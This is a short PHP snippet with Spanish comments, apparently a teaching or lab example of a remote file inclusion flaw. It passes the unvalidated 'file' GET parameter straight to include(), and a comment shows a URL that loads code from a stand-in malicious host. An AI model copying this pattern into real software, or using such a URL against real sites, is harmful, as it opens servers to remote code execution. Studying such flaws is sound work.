<?php
// Obtener el nombre del archivo a incluir desde el parámetro 'file' sin validación
$file = $_GET['file'];

// Incluir el archivo indicado por el parámetro 'file' (sin validación)
include($file);

// Ejemplo:
// http://localhost:8080/index.php?file=http://servidor.malicioso.com/malicioso.php

?>
